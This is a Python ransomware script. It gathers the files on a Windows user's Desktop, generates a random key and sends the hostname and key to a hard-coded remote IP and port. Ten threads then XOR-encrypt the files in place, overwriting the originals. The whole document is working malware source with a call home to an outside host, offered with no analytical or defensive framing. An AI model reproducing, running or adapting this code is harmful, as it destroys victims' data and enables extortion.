import socket
import os
import threading
import queue
import random
import string


# Encryption Function That Threads Will Run
def encrypt(key):
    while True:
        file = q.get()
        print(f"Encrypting File: {file}")
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')

            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                    # Increment Key Index
                    if key_index >= max_key_index:
                        key_index = 0
                    else:
                        key_index += 1
                print(f"{file} successfully encrypted")
            
        except:
            print(f"Failed to encrypt {file} :(")
        q.task_done()


# Socket Information
IP_ADDRESS = "172.29.138.13"
PORT = 9001



# Encryption Information
ENCRYPTION_LEVEL = 512 // 8             # 512 bit encryption = 64 bytes
key_char_pool = string.ascii_letters + string.punctuation
key_char_pool_len = len(key_char_pool)

# Grab file paths to encrypt
print("Preparing files...")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f"{desktop_path}\\{f}") and f != __file__[:-2]+"exe":
        abs_files.append(f"{desktop_path}\\{f}")

print("Successfully located all files!")

# Grab clients hostname
hostname = os.getenv("COMPUTERNAME")

# Generate encryption key
print("Generating Encryption Key...")
key = ''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]

print("Key Generated!!!")

# Connect to server to transfer key and hostname
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print("Successfully connected....transmitting hostname and key")
    s.send(f"{hostname}: {key}".encode("utf-8"))
    print('Finished transmitting data!')
    s.close()


# Store files in a queue for threads to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Setup threads to get ready for encryption ;)
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print("Encryption and upload complete!!! ;)")

input()